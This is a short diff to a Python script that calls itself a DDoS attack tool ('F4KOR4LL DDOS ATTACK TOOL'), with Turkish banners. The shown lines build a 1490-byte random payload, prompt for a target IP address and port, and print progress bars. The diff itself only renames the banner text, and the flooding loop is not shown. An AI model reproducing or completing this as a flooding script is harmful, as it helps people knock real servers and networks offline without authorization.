@@ -19,13 +19,13 @@ baytlar = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Saldırısı")
+os.system("figlet DDos Saldiri Araci")
 print 
 ip = input("IP Hedefi : ")
 port = input("Port numarasını girin: ")
 
 os.system("clear")
-os.system("figlet Saldırı Başlatılıyor")
+os.system("figlet F4KOR4LL DDOS ATTACK TOOL")
 print("[                    ] 0% ")
 time.sleep(5)
 print("[=====               ] 25%")
